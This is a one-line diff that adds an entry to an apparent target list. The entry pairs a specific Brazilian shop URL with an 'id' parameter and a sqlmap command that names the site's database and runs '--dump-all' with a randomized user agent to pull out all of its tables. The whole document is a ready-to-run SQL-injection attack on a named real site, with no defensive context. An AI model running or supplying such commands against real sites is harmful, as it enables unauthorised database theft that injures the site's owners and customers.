@@ -1,0 +1,1 @@
+http://www.cataventosfortuna.com.br/produto.php?id=20 (GET)  # sqlmap.py -u http://www.cataventosfortuna.com.br/produto.php?id=20 -D cataventosfort --threads 5 -v3 --random-agent --tables --dump-all
